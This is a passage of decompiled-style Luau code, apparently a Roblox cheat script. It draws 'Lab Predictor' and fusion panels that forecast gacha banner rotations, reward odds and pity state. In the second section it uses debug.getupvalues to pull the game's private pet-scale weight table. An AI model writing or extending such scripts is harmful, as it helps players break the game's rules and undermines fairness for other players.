arg:SetDock(5, { Gap = n2, DividerColor = Color3.fromRGB(170, 174, 184) })
local v15 = arg:Dock()
tbl13.Icon = arg:Image({
Parent = v15,
X = 0,
Y = 0,
Width = n36,
Height = n36,
Corner = 0.35,
Background = "#000000",
BackgroundTransparency = 0.26,
StrokeThickness = n46,
StrokeTransparency = 0,
ZIndex = 8,
})
tbl13.Name = arg:Text({
Parent = v15,
X = n37,
Y = 0,
Height = n38,
Scale = n39,
Wrap = false,
Gradient = tbl12.NameGradient,
TextStrokeTransparency = 1,
ZIndex = 9,
})
tbl13.Rarity = arg:Text({
Parent = v15,
X = n37,
Y = 0,
Height = n38,
Scale = n40,
Wrap = false,
Font = tbl12.RarityFont,
TextStrokeTransparency = 1,
StrokeTransparency = 0.08,
ZIndex = 9,
})
tbl13.Info = arg:Text({ Parent = v15, X = n37, Y = n38, Height = n36 - n38, Wrap = false, ZIndex = 9 })
arg:OnResize(function(arg2, arg3, arg4)
if arg3 == n50 and arg4 == n51 then
return
end
n50 = arg3
n51 = arg4
n47 = arg3 / math.max(arg4, 1)
n48 = arg4
n3 = 2
n49 = 0.9 / math.max(arg:TextSize(), 1)
tbl13.Rarity.Set({ StrokeThickness = n49 })
for _, v16 in ipairs(tbl14) do
v16.Rarity.Set({ StrokeThickness = n49 })
end
end)
end
local function fn42(arg)
local v15 = arg and arg.Get()
if not v15 or n48 <= 0 then
return nil
end
if v15.Text ~= tostring(arg.Spec.Text or "") then
return nil
end
return v15
end
local function fn43(arg)
local v15 = fn42(arg)
if not v15 then
return nil
end
local size = v15.Size
local textWrapped = v15.TextWrapped
v15.TextWrapped = false
v15.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
local x = v15.TextBounds.X
v15.Size = size
v15.TextWrapped = textWrapped
if x <= 0 then
return nil
end
return x / n48
end
local function fn44(arg, arg2)
local v15 = fn42(arg)
if not v15 then
return nil
end
local size = v15.Size
v15.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n48 + 0.5)), 100000)
local y = v15.TextBounds.Y
v15.Size = size
if y <= 0 then
return nil
end
return y / n48
end
fn12 = function(arg)
local v15 = tbl15[arg]
if not v15 then
local v16 = v10:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
tbl15[arg] = v16
v15 = v16
end
return v15
end
fn13 = function(arg)
local v15 = tbl14[arg]
if v15 then
return v15
end
local tbl36 = {
Frame = v10:Frame({
Name = "Slot",
Background = "#000000",
BackgroundTransparency = 0.74,
Corner = 0.35,
X = 0,
Y = 0,
Width = 1,
Height = 1,
Visible = false,
}),
}
tbl36.Icon = v10:Image({
Parent = tbl36.Frame,
X = n42,
Y = 0,
Width = n41,
Height = n41,
Corner = 0.35,
Background = "#000000",
BackgroundTransparency = 0.255,
StrokeThickness = n46,
StrokeTransparency = 0,
})
tbl36.Name = v10:Text({
Parent = tbl36.Frame,
X = n42 + n44,
Y = 0,
Width = 1,
Height = n38,
Scale = n39,
Wrap = false,
Gradient = tbl12.NameGradient,
TextStrokeTransparency = 1,
})
tbl36.Rarity = v10:Text({
Parent = tbl36.Frame,
X = n42 + n44,
Y = 0,
Width = 1,
Height = n38,
Scale = n40,
Wrap = false,
Font = tbl12.RarityFont,
TextStrokeTransparency = 1,
StrokeTransparency = 0.08,
StrokeThickness = n49,
})
tbl36.Detail = v10:Text({
Parent = tbl36.Frame,
X = n42 + n44,
Y = n38,
Width = math.max(1, n47 - n44 - n42 * 2),
Height = 1,
Wrap = true,
})
tbl36.Status = v10:Text({
Parent = tbl36.Frame,
X = 0,
Y = 0,
Width = 1,
Height = n38,
Wrap = false,
Align = "Right",
Color = color.Hint,
})
tbl14[arg] = tbl36
return tbl36
end
fn14 = function()
if n47 <= 0 then
return
end
flag = false
local n55 = math.max(1, n47 - n37)
local v15 = fn43(tbl13.Rarity)
if v15 then
n54 = v15 + 0.1
else
flag = true
end
local v16 = fn43(tbl13.Name)
if v16 then
n53 = math.min(v16 + 0.1, math.max(1, n55 - n54 - n45))
else
flag = true
end
tbl13.Name.Set({ X = n37, Y = 0, Width = n53, Height = n38 })
tbl13.Rarity.Set({
X = n37 + n53 + n45,
Y = 0,
Width = math.max(0.5, math.min(n54, n55 - n53 - n45)),
Height = n38,
})
tbl13.Info.Set({ X = n37, Y = n38, Width = n55, Height = math.max(1, n36 - n38) })
local n56 = math.max(1, n47 - n44 - n42 * 2)
local n57 = 0
for _, v17 in ipairs(tbl16) do
if v17.Kind == "text" then
local handle = v17.Handle
local v18 = fn44(handle, n47)
if v18 then
v17.Height = v18
else
flag = true
end
local n58 = math.max(1, v17.Height or 1)
handle.Set({ X = 0, Y = n57 + (v17.Gap and 0.5 or 0), Width = n47, Height = n58 })
n57 += n58 + n2 * 0.5 + (v17.Gap and 0.5 or 0)
else
local slot = v17.Slot
local v18 = fn44(slot.Detail, n56)
if v18 then
slot.DetailUnits = v18
else
flag = true
end
local n58 = math.clamp(slot.DetailUnits or 1, 1, 4)
local v19 = fn43(slot.Status)
if v19 then
slot.StatusUnits = v19 + 0.23
else
flag = true
end
local n59 = math.min(n56 * 0.42, math.max(2.73, slot.StatusUnits or 2.73))
local n60 = math.max(1, n56 - n59 - n45)
local v20 = fn43(slot.Rarity)
if v20 then
slot.RarityUnits = v20 + 0.1
else
flag = true
end
local n61 = math.min(slot.RarityUnits or 3, n60 * 0.5)
local v21 = fn43(slot.Name)
if v21 then
slot.NameUnits = v21 + 0.1
else
flag = true
end
local min = math.min
local max = math.max
local nameUnits = slot.NameUnits or 4
local max2 = math.max
local n62 = n60 - n61 - n45
local v22 = min(max(1, nameUnits), max2(1, n62))
local n63 = n43 * 2
local n64 = math.max(n58 + n38, 2.3) + n63
local n65 = (n64 - n58 - n38) / 2
slot.Frame.Set({ X = 0, Y = n57, Width = n47, Height = n64 })
slot.Icon.Set({ Y = (n64 - n41) / 2 })
slot.Name.Set({ X = n42 + n44, Y = n65, Width = v22 })
slot.Rarity.Set({ X = n42 + n44 + v22 + n45, Y = n65, Width = math.max(0.5, n61) })
slot.Detail.Set({ X = n42 + n44, Y = n65 + n38, Width = n56, Height = n58 })
slot.Status.Set({ X = n42 + n44 + n56 - n59, Y = n65, Width = math.max(0.5, n59) })
n57 += n64 + n2
end
end
local n58 = math.max(1, n57)
if math.abs(n58 - n52) > 0.01 then
n52 = n58
v10:SetContentLines(n58)
end
end
end
do
local v11 = fn2(function()
return ReplicatedStorage.Data.ScrambleTradeIn
end)
local n4 = 30
local tbl17 = { Biohazard = "#9DFF4D", Experimental = "#5AD8FF", UnstableDNA = "#FF6BD5" }
local v12 = nil
local flag2 = false
local n5 = 0
local tbl18 = { Banner = {}, Odds = {}, Chance = {}, Clears = 0 }
local function fn15(arg)
return tbl17[tostring(arg)] or color.Text
end
local function fn16(arg, ...)
if type(v11) ~= "table" or type(v11[arg]) ~= "function" then
return nil
end
local ok, result = pcall(v11[arg], ...)
if ok then
return result
end
return nil
end
local function fn17(arg)
return tostring(fn16("GetBannerDisplayName", arg) or arg)
end
local function fn18(arg)
local BannerIdForPeriod = tbl18.Banner[arg]
if BannerIdForPeriod == nil then
BannerIdForPeriod = fn16("BannerIdForPeriod", arg) or false
tbl18.Banner[arg] = BannerIdForPeriod
end
return BannerIdForPeriod or nil
end
local function fn19(arg)
local v13, v14, v15 = ipairs(type(v11) == "table" and v11.Banners or {})
local n6 = 0
local n7 = 0
for _, v16 in v13, v14, v15 do
local n8 = tonumber(fn16("GetBannerWeight", v16.Id)) or 0
n6 += n8
if v16.Id == arg then
n7 = n8
end
end
return n6 > 0 and n7 / n6 * 100 or 0
end
local function fn20(arg)
local v13 = tbl18.Chance[arg]
if v13 == nil then
v13 = fn19(arg)
tbl18.Chance[arg] = v13
end
return v13
end
local function fn21(arg)
local GetBanner = fn16("GetBanner", arg)
local tbl19 = {}
local v13 = ipairs
local pets = type(GetBanner) == "table" and GetBanner.Pets or {}
local n6 = 0
for _, pet in v13(pets) do
local n7 = tonumber(fn16("GetPetWeight", arg, pet.AssetId)) or 0
if n7 > 0 then
n6 += n7
table.insert(tbl19, { AssetId = pet.AssetId, Weight = n7 })
end
end
for _, v14 in ipairs(tbl19) do
v14.Chance = n6 > 0 and v14.Weight / n6 * 100 or 0
end
table.sort(tbl19, function(arg2, arg3)
return arg2.Chance > arg3.Chance
end)
return tbl19
end
local function fn22(arg)
local v13 = tbl18.Odds[arg]
if v13 == nil then
local v14 = fn21(arg)
tbl18.Odds[arg] = v14
v13 = v14
end
return v13
end
local function fn23(arg)
local ok, result = pcall(os.date, "%I:%M %p", math.floor(arg))
if not ok then
return ""
end
return (string.gsub(tostring(result), "^0", ""))
end
local function fn24(arg)
local n6 = math.max(0, math.floor(arg))
local n7 = math.floor(n6 / 86400)
local n8 = math.floor(n6 % 86400 / 3600)
local n9 = math.floor(n6 % 3600 / 60)
if n7 > 0 then
return string.format("%dd %dh %02dm", n7, n8, n9)
end
return string.format("%dh %02dm", n8, n9)
end
local function fn25(arg)
local income = arg >= 10 and color.Income or arg >= 1 and color.Clock or "#FF7A7A"
local str = string.format(arg >= 1 and "%.1f%%" or "%.2f%%", arg)
return bold(paint(income, str))
end
local function fn26(arg)
if arg <= 0 then
return ""
end
local n6 = 100 / arg
return paint(color.Hint, n6 < 10 and string.format("1 in %.1f", n6) or string.format("1 in %d", math.floor(n6 + 0.5)))
end
local function fn27(arg)
if next(tbl4.Lab.Banners) ~= nil and tbl4.Lab.Banners[tostring(arg)] then
return tbl12.Separator() .. bold(paint(color.Ready, "Your pick"))
end
return ""
end
local function fn28()
if flag2 or os.clock() < n5 then
return
end
flag2 = true
n5 = os.clock() + n4
task.spawn(function()
local rfScrambleTradeInAskState = networking:FindFirstChild("RF/ScrambleTradeIn/AskState")
if rfScrambleTradeInAskState and rfScrambleTradeInAskState:IsA("RemoteFunction") then
local ok, result = pcall(rfScrambleTradeInAskState.InvokeServer, rfScrambleTradeInAskState)
if ok and type(result) == "table" then
v12 = result
end
end
flag2 = false
end)
end
local function fn29(arg, arg2, arg3)
local flag3 = arg ~= nil
v10:SetDock(flag3 and 5 or 0, { Gap = n2 })
tbl13.Icon.Set({ Visible = flag3 })
tbl13.Name.Set({ Visible = flag3 })
tbl13.Rarity.Set({ Visible = flag3 })
tbl13.Info.Set({ Visible = flag3 })
if not flag3 then
return
end
local v13 = fn15(arg)
local GetBannerEggIcon = fn16("GetBannerEggIcon", arg)
tbl13.Icon.Set({
Visible = type(GetBannerEggIcon) == "string" and GetBannerEggIcon ~= "",
Image = type(GetBannerEggIcon) == "string" and GetBannerEggIcon or "",
StrokeColor = Color3.fromHex(v13),
})
tbl13.Name.Set({ Text = tbl12.Escape(fn17(arg)) })
tbl13.Rarity.Set({ Text = "ACTIVE", Color = Color3.fromHex(color.Ready), Gradient = nil })
local n6 = arg3 - arg2 % arg3
local tbl19 = {}
local str = bold(paint(color.Clock, "Ends in " .. tbl12.FormatClock(n6))) .. tbl12.Separator() .. paint(color.Text, fn23(arg2 + n6))
local str2 = paint(color.Hint, "Banner chance ") .. fn25(fn20(arg))
tbl19[1] = str
tbl19[2] = str2
local v14 = v12
if type(v14) == "table" and v14.BannerId == arg then
if v14.Unlocked == false then
table.insert(tbl19, paint("#FF7A7A", "Locked on this account"))
else
table.insert(tbl19, paint(color.Hint, "Pity ") .. bold(paint(color.Text, string.format("%s/%s", tostring(v14.PityCount or 0), tostring(v14.PityThreshold or 0)))) .. tbl12.Separator() .. paint(color.Hint, "Free rerolls ") .. bold(paint(color.Text, tostring(v14.FreeRefreshesRemaining or 0))))
end
end
tbl13.Info.Set({ Text = table.concat(tbl19, "\n") })
end
local function fn30()
if not v10 then
return
end
n3 = 2
table.clear(tbl16)
local n6 = 0
local n7 = 0
local function fn31(arg, arg2)
n6 += 1
local v13 = fn12(n6)
v13.Set({ Visible = true, Text = arg })
table.insert(tbl16, { Kind = "text", Handle = v13, Gap = arg2 })
end
local function fn32(arg, arg2)
local flag3 = #tbl16 > 0
fn31(string.format("<b><font color=\"%s\">%s</font></b>", arg2, arg), flag3)
end
local function fn33()
n7 += 1
local v13 = fn13(n7)
v13.Frame.Set({ Visible = true })
table.insert(tbl16, { Kind = "slot", Slot = v13 })
return v13
end
local serverTimeNow = workspace:GetServerTimeNow()
local n8 = tonumber(fn16("RotationSeconds")) or 3600
local n9 = math.floor(serverTimeNow / n8)
if tbl18.Clears <= os.clock() then
tbl18.Clears = os.clock() + 60
table.clear(tbl18.Banner)
table.clear(tbl18.Odds)
table.clear(tbl18.Chance)
end
local v13 = fn18(n9)
if type(v11) ~= "table" or v13 == nil then
fn29(nil)
fn31(bold(paint(color.Hint, "Lab data is not available yet")), false)
else
fn29(v13, serverTimeNow, n8)
local v14 = v12
if type(v14) == "table" and v14.BannerId == v13 and type(v14.Requirements) == "table" and #v14.Requirements > 0 then
fn32("CURRENT RECIPE", color.Text)
local tbl19 = {}
for _, requirement in ipairs(v14.Requirements) do
local v15 = tbl12.AssetInfo(requirement)
local insert = table.insert
local v16 = table.pack(bold(paint(v15.Hex, tbl12.Escape(v15.Name))))
insert(tbl19, table.unpack(v16, 1, v16.n))
end
fn31(table.concat(tbl19, tbl12.Separator()), false)
end
fn32("REWARD ODDS" .. tbl12.Separator() .. string.upper(fn17(v13)), fn15(v13))
local v15 = fn22(v13)
for i, v16 in ipairs(v15) do
local v17 = tbl12.AssetInfo(v16.AssetId)
local v18 = fn33()
v18.Icon.Set({ Visible = v17.Icon ~= nil, Image = v17.Icon or "", StrokeColor = v17.Color })
v18.Name.Set({ Text = tbl12.Escape(v17.Name) })
v18.Rarity.Set({
Text = string.upper(tostring(v17.Rarity)),
Color = fn9(v17),
Gradient = fn8(v17),
GradientRotation = fn10(v17),
})
v18.Status.Set({ Text = fn25(v16.Chance) })
local v19 = fn26(v16.Chance)
if i == #v15 then
v19 ..= tbl12.Separator() .. bold(paint(color.Clock, "Chase pet"))
end
v18.Detail.Set({ Text = v19 })
end
fn32("UPCOMING LAB BANNERS", color.Text)
for i = 1, 8 do
local v16 = fn18(n9 + i)
local n10 = (n9 + i) * n8
local v17 = fn33()
local GetBannerEggIcon = fn16("GetBannerEggIcon", v16)
local v18 = fn15(v16)
v17.Icon.Set({
Visible = type(GetBannerEggIcon) == "string" and GetBannerEggIcon ~= "",
Image = type(GetBannerEggIcon) == "string" and GetBannerEggIcon or "",
StrokeColor = Color3.fromHex(v18),
})
v17.Name.Set({ Text = tbl12.Escape(fn17(v16)) })
v17.Rarity.Set({ Text = i == 1 and "NEXT" or "#" .. i, Color = Color3.fromHex(v18), Gradient = nil })
v17.Status.Set({ Text = bold(paint(color.Clock, "in " .. fn24(n10 - serverTimeNow))) })
local v19 = fn22(v16)
local v20 = v19[#v19]
local str = paint(color.Hint, "Starts ") .. paint(color.Text, fn23(n10)) .. fn27(v16)
local str2
if v20 then
local v21 = tbl12.AssetInfo(v20.AssetId)
str2 = str .. tbl12.Separator() .. paint(color.Hint, "Chase ") .. bold(paint(v21.Hex, tbl12.Escape(v21.Name))) .. " " .. fn25(v20.Chance)
else
str2 = str
end
v17.Detail.Set({ Text = str2 })
end
fn32("NEXT TIME EACH BANNER OPENS", color.Text)
local v16 = ipairs
local banners = v11.Banners or {}
for _, banner in v16(banners) do
local v17 = fn15(banner.Id)
local v18 = table.pack(tbl12.Escape(fn17(banner.Id)))
local v19 = paint
v18.n = 2 + v18.n - 1
table.move(v18, 1, v18.n, 2, v18)
v18[1] = v17
local v20 = bold(v19(table.unpack(v18, 1, v18.n)))
local str
if banner.Id == v13 then
str = v20 .. tbl12.Separator() .. bold(paint(color.Ready, "Open now"))
else
local v21 = nil
for i = 1, 2000 do
local id = banner.Id
if fn18(n9 + i) == id then
v21 = i
break
else
v21 = nil
end
end
if v21 then
local n10 = (n9 + v21) * n8
str = v20 .. tbl12.Separator() .. bold(paint(color.Clock, "in " .. fn24(n10 - serverTimeNow))) .. tbl12.Separator() .. paint(color.Text, fn23(n10))
else
str = v20 .. tbl12.Separator() .. paint(color.Hint, "Not soon")
end
end
fn31(str .. tbl12.Separator() .. paint(color.Hint, "chance ") .. fn25(fn20(banner.Id)) .. fn27(banner.Id), false)
end
end
for i = n6 + 1, #tbl15 do
tbl15[i].Set({ Visible = false })
end
for i = n7 + 1, #tbl14 do
tbl14[i].Frame.Set({ Visible = false })
end
fn14()
n3 = 2
end
if not tbl12.Ready then
v8:CreateText({ Name = "Lab Predictor", Text = "Predictor preview card needs a canvas-capable Virex UI." })
else
local v13 = v8:CreateCanvas({
Name = "Lab Predictor",
Layout = "free",
Style = {
TextScale = 0.84,
LineHeight = 1.1,
MinLines = 16,
MaxLines = 34,
BackgroundTransparency = 0.5,
ScrollBarColor = Color3.fromRGB(170, 174, 184),
TextColor = Color3.fromRGB(255, 255, 255),
TextStrokeTransparency = 0.7,
},
Build = function(arg)
fn11(arg)
pcall(fn30)
end,
})
fn4(function()
v13:Destroy()
end)
local n6 = 1
local connection = RunService.Heartbeat:Connect(function(deltaTime)
if not v10 or not tbl12.PageVisible() or not tbl12.IsShown(v10:Root()) then
return
end
fn28()
n6 += deltaTime
if n6 >= 1 then
n6 = 0
pcall(fn30)
end
if n3 > 0 or flag then
if n3 > 0 then
n3 -= 1
end
pcall(fn14)
end
end)
fn4(function()
connection:Disconnect()
end)
end
end
local paint2, bold2, color2, n4, n5, n6, n7, n8, n9, n10
local n11, n12
do
local tbl17 = {
{ min = 0.85, max = 1.05, weight = 2000 },
{ min = 1.45, max = 1.55, weight = 250 },
{ min = 1.9, max = 2.1, weight = 125 },
{ min = 2.85, max = 3.15, weight = 62.5 },
{ min = 3.8, max = 4.2, weight = 31.25 },
{ min = 0.3, max = 0.45, weight = 18 },
{ min = 0.1, max = 0.2, weight = 5 },
{ min = 5.8, max = 6.2, weight = 15.625 },
{ min = 9.5, max = 12.5, weight = 3 },
{ min = 12, max = 17, weight = 0.05 },
{ min = 20, max = 35, weight = 0.0001 },
}
paint2 = tbl12.Paint
bold2 = tbl12.Bold
color2 = tbl12.Color
n4 = 5
n5 = n4 + 0.8
n6 = 1.2
n7 = 1.2
n8 = 0.936
n9 = 2.3
n10 = 0.25
n11 = 0.18
local n13 = n9 + 0.6
local n14 = 0.24
n12 = 0.22
local n15 = 0.0909
local v11 = nil
local tbl18 = {}
local tbl19 = {}
local tbl20 = {}
local tbl21 = {}
local n16 = 0
local n17 = 0
local n18 = 0.06
local n19 = -1
local n20 = -1
local n21 = -1
local n22 = 4
local n23 = 3
local flag2 = false
local n24 = 0
local v12 = nil
local tbl22 = {
{ Min = 0, Color = "#8F98A8" },
{ Min = 0.3, Color = "#C6CDDA" },
{ Min = 0.85, Color = "#FFFFFF" },
{ Min = 1.45, Color = "#7CFF9E" },
{ Min = 1.9, Color = "#4FE0FF" },
{ Min = 2.85, Color = "#6FA0FF" },
{ Min = 3.8, Color = "#C08BFF" },
{ Min = 5.8, Color = "#FF9A3D" },
{ Min = 9.5, Color = "#FF5C5C" },
{ Min = 12, Color = "#FFD34D" },
{ Min = 20, Color = "#FF4DE8" },
}
local function fn15(arg)
local n25 = -math.huge
local str = "#FFFFFF"
for _, v13 in ipairs(tbl22) do
if arg + 0.001 >= v13.Min and v13.Min > n25 then
str = v13.Color
n25 = v13.Min
end
end
return str
end
local function fn16(arg, arg2)
local eggRecords = tbl.EggRecords
if type(eggRecords) ~= "table" or type(eggRecords.WeightKgForScale) ~= "function" then
return nil
end
local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)
if ok and type(result) == "number" and result > 0 then
return result
end
return nil
end
local function fn17(arg)
if type(arg) ~= "table" or #arg == 0 then
return nil
end
local n25 = -math.huge
local v13 = nil
for _, v14 in ipairs(arg) do
local v15 = tbl12.MutationMultiplier({ v14 })
if v15 > n25 then
n25 = v15
v13 = v14
end
end
return v13
end
local function fn18()
if v12 then
return v12
end
local eggRecords = tbl.EggRecords
local getupvalues_ = type(debug) == "table" and debug.getupvalues or getupvalues
if type(eggRecords) == "table" and type(eggRecords.DrawAssetScale) == "function" and type(getupvalues_) == "function" then
local ok, result = pcall(getupvalues_, eggRecords.DrawAssetScale)
if ok and type(result) == "table" then
for _, v13 in pairs(result) do
if type(v13) == "table" and type(v13[1]) == "table" and v13[1].min and v13[1].weight then
v12 = v13
break
end
end
end
end
v12 = v12 or tbl17
return v12
end
local function fn19(arg, arg2, arg3)
local fuseKernel = tbl.FuseKernel
if type(fuseKernel) == "table" and type(fuseKernel.BandWeightBias) == "function" then
local ok, result = pcall(fuseKernel.BandWeightBias, arg, arg2, arg3)
if ok and type(result) == "number" then
return result
end
end
return math.exp(math.log((arg[1] + arg[2] + arg[3]) / 3) / 0.69314718055994529 * math.log((arg2 + arg3) / 2) / 0.69314718055994529 * 0.6)
end
local function fn20()
local save = tbl.Save
if type(save) ~= "table" or type(save.Get) ~= "function" then
return nil
end
local ok, result = pcall(save.Get)
if not ok or type(result) ~= "table" then
return nil
end
local fusionSlots = type(result.FusionSlots) == "table" and result.FusionSlots or {}
local inventory = type(result.Inventory) == "table" and result.Inventory or {}
local tbl23 = {}
for i = 1, 3 do
local v13 = fusionSlots[i]
local flag3 = v13 ~= nil and inventory[v13] or nil
if type(flag3) == "table" then
table.insert(tbl23, {
Category = flag3.Category,
Scale = tonumber(flag3.Scale) or 1,
Mutations = type(flag3.Mutations) == "table" and flag3.Mutations or {},
})
end
end
return {
Items = tbl23,
Locked = result.FusionLocked == true,
Duration = tonumber(result.FusionDuration) or 0,
Reward = result.FusionEggReward ~= nil and result.FusionEggReward ~= false,
}
end
local function fn21(arg)
if string.upper(tostring(arg.Rarity)) == "SECRET" then
return tbl12.SecretGradient
end
return arg.Gradient
end
local function fn22(arg)
return fn21(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
end
local function fn23(arg)
if string.upper(tostring(arg.Rarity)) == "SECRET" then
return tbl12.SecretRotation
end
return nil
end
local function fn24(arg)
v11 = arg
arg:SetDock(5, { Gap = n12, DividerColor = Color3.fromRGB(170, 174, 184) })
local v13 = arg:Dock()
tbl18.Icon = arg:Image({
Parent = v13,
X = 0,
Y = 0,
Width = n4,
Height = n4,
Corner = 0.35,
Background = "#000000",
BackgroundTransparency = 0.26,
StrokeThickness = n15,
StrokeTransparency = 0,
ZIndex = 8,
})
tbl18.Name = arg:Text({
Parent = v13,
X = n5,
Y = 0,
Height = n6,
Scale = n7,
Wrap = false,
Gradient = tbl12.NameGradient,
TextStrokeTransparency = 1,
ZIndex = 9,
})
tbl18.Rarity = arg:Text({
Parent = v13,
X = n5,
Y = 0,
Height = n6,
Scale = n8,
Wrap = false,
Font = tbl12.RarityFont,
TextStrokeTransparency = 1,
StrokeTransparency = 0.08,
ZIndex = 9,
})
tbl18.Info = arg:Text({ Parent = v13, X = n5, Y = n6, Height = n4 - n6, Wrap = false, ZIndex = 9 })
arg:OnResize(function(arg2, arg3, arg4)
if arg3 == n19 and arg4 == n20 then
return
end
n19 = arg3
n20 = arg4
n16 = arg3 / math.max(arg4, 1)
n17 = arg4
n24 = 2
n18 = 0.9 / math.max(arg:TextSize(), 1)
tbl18.Rarity.Set({ StrokeThickness = n18 })
for _, v14 in ipairs(tbl19) do
v14.Rarity.Set({ StrokeThickness = n18 })
end
end)
end
local function fn25(arg)
local v13 = arg and arg.Get()
if not v13 or n17 <= 0 then
return nil
end
if v13.Text ~= tostring(arg.Spec.Text or "") then
return nil
end
return v13
end
local function fn26(arg)
local v13 = fn25(arg)
if not v13 then
return nil
end
local size = v13.Size
local textWrapped = v13.TextWrapped
v13.TextWrapped = false
v13.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
local x = v13.TextBounds.X
v13.Size = size
v13.TextWrapped = textWrapped
if x <= 0 then
return nil
end
return x / n17
end
local function fn27(arg, arg2)
local v13 = fn25(arg)
if not v13 then
return nil
end
local size = v13.Size
v13.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n17 + 0.5)), 100000)
local y = v13.TextBounds.Y
v13.Size = size
if y <= 0 then
return nil
end
return y / n17
end
local function fn28(arg)
local v13 = tbl20[arg]
if not v13 then
local v14 = v11:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
tbl20[arg] = v14
v13 = v14
end
return v13
end
local function fn29(arg)
local v13 = tbl19[arg]
if v13 then
return v13
end
local tbl23 = {
Frame = v11:Frame({
Name = "Slot",
Background = "#000000",
BackgroundTransparency = 0.74,
Corner = 0.35,
X = 0,
Y = 0,
Width = 1,
Height = 1,
Visible = false,
}),
}
tbl23.Icon = v11:Image({
Parent = tbl23.Frame,
X = n10,
Y = 0,
Width = n9,
Height = n9,
Corner = 0.35,
Background = "#000000",
BackgroundTransparency = 0.255,
StrokeThickness = n15,
StrokeTransparency = 0,
})
tbl23.Name = v11:Text({
Parent = tbl23.Frame,
X = n10 + n13,
Y = 0,
Width = 1,
Height = n6,
Scale = n7,
Wrap = false,
Gradient = tbl12.NameGradient,
TextStrokeTransparency = 1,
})
tbl23.Rarity = v11:Text({
Parent = tbl23.Frame,
X = n10 + n13,
Y = 0,
Width = 1,
Height = n6,
Scale = n8,
Wrap = false,
Font = tbl12.RarityFont,
TextStrokeTransparency = 1,
StrokeTransparency = 0.08,
StrokeThickness = n18,
})
tbl23.Detail = v11:Text({
Parent = tbl23.Frame,
X = n10 + n13,
Y = n6,
Width = math.max(1, n16 - n13 - n10 * 2),
Height = 1,
Wrap = true,
})
tbl23.Status = v11:Text({
Parent = tbl23.Frame,
X = 0,
Y = 0,
Width = 1,
Height = n6,
Wrap = false,
Align = "Right",
Color = color2.Hint,
})
tbl19[arg] = tbl23
return tbl23
end
local function fn30()
if n16 <= 0 then
return
end
flag2 = false
local n25 = math.max(1, n16 - n5)
local v13 = fn26(tbl18.Rarity)
if v13 then
n23 = v13 + 0.1
else
flag2 = true
end
local v14 = fn26(tbl18.Name)
if v14 then
n22 = math.min(v14 + 0.1, math.max(1, n25 - n23 - n14))
else
flag2 = true
end
tbl18.Name.Set({ X = n5, Y = 0, Width = n22, Height = n6 })
tbl18.Rarity.Set({
X = n5 + n22 + n14,
Y = 0,
Width = math.max(0.5, math.min(n23, n25 - n22 - n14)),
Height = n6,
})
tbl18.Info.Set({ X = n5, Y = n6, Width = n25, Height = math.max(1, n4 - n6) })
local n26 = math.max(1, n16 - n13 - n10 * 2)
local n27 = 0
for _, v15 in ipairs(tbl21) do
if v15.Kind == "text" then
local handle = v15.Handle
local v16 = fn27(handle, n16)
if v16 then
v15.Height = v16
else
flag2 = true
end
local n28 = math.max(1, v15.Height or 1)
handle.Set({ X = 0, Y = n27 + (v15.Gap and 0.5 or 0), Width = n16, Height = n28 })
n27 += n28 + n12 * 0.5 + (v15.Gap and 0.5 or 0)
else
local slot = v15.Slot
local v16 = fn27(slot.Detail, n26)
if v16 then
slot.DetailUnits = v16
else
flag2 = true
end
local n28 = math.clamp(slot.DetailUnits or 1, 1, 4)
local v17 = fn26(slot.Status)
if v17 then
slot.StatusUnits = v17 + 0.23
else
flag2 = true
end
local n29 = math.min(n26 * 0.42, math.max(2.73, slot.StatusUnits or 2.73))
local n30 = math.max(1, n26 - n29 - n14)
local v18 = fn26(slot.Rarity)
if v18 then
slot.RarityUnits = v18 + 0.1
else
flag2 = true
end
local n31 = math.min(slot.RarityUnits or 3, n30 * 0.5)
local v19 = fn26(slot.Name)
if v19 then
slot.NameUnits = v19 + 0.1
else
flag2 = true
end
local min = math.min
local max = math.max
local nameUnits = slot.NameUnits or 4
local max2 = math.max
local n32 = n30 - n31 - n14
local v20 = min(max(1, nameUnits), max2(1, n32))
local n33 = n11 * 2
local n34 = math.max(n28 + n6, 2.3) + n33
local n35 = (n34 - n28 - n6) / 2
slot.Frame.Set({ X = 0, Y = n27, Width = n16, Height = n34 })
slot.Icon.Set({ Y = (n34 - n9) / 2 })
slot.Name.Set({ X = n10 + n13, Y = n35, Width = v20 })
slot.Rarity.Set({ X = n10 + n13 + v20 + n14, Y = n35, Width = math.max(0.5, n31) })
slot.Detail.Set({ X = n10 + n13, Y = n35 + n6, Width = n26, Height = n28 })
slot.Status.Set({ X = n10 + n13 + n26 - n29, Y = n35, Width = math.max(0.5, n29) })
n27 += n34 + n12
end
end
local n28 = math.max(1, n27)
if math.abs(n28 - n21) > 0.01 then
n21 = n28
v11:SetContentLines(n28)
end
end
local function fn31(arg, arg2)
local flag3 = arg ~= nil
v11:SetDock(flag3 and 5 or 0, { Gap = n12 })
tbl18.Icon.Set({ Visible = flag3 })
tbl18.Name.Set({ Visible = flag3 })
tbl18.Rarity.Set({ Visible = flag3 })
tbl18.Info.Set({ Visible = flag3 })
if not flag3 then
return
end
tbl18.Icon.Set({ Visible = arg.Icon ~= nil, Image = arg.Icon or "", StrokeColor = arg.Color })
tbl18.Name.Set({ Text = tbl12.Escape(arg.Name) })
tbl18.Rarity.Set({
Text = string.upper(tostring(arg.Rarity)),
Color = fn22(arg),
Gradient = fn21(arg),
GradientRotation = fn23(arg),
})
local v13 = paint2(color2.Text, string.format("Fusing %d of 3 pets", #arg2.Items))
if arg2.Reward then
v13 = bold2(paint2(color2.Ready, "Fuse finished, claim your egg"))
elseif arg2.Locked then
local n25 = arg2.Duration > 1e9 and arg2.Duration - workspace:GetServerTimeNow() or 0
v13 = bold2(paint2(color2.Clock, n25 > 0 and "Fusing" .. tbl12.Separator() .. tbl12.FormatClock(n25) or "Fusing"))
end
local set = tbl18.Info.Set
local tbl23 = {}
local concat = table.concat
local tbl24 = {}
local v14 = bold2(paint2(color2.Income, tbl12.FormatRate(tbl12.Income(arg, arg2.Items[1].Scale, arg2.Items[1].Mutations))))
